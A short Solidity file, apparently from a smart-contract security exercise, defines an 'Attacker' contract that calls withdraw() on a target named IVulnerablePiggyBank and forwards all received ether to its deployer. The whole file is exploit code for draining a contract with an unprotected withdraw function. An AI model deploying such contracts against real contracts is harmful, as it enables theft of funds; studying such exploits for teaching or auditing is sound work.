// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerablePiggyBank {
    function withdraw() external;
}

contract Attacker {
    address public owner;
    address public target;

    constructor(address _target) {
        owner = msg.sender;
        target = _target;
    }

    function attack() public {
        IVulnerablePiggyBank(target).withdraw();
    }

    receive() external payable {
        payable(owner).transfer(msg.value);
    }
}
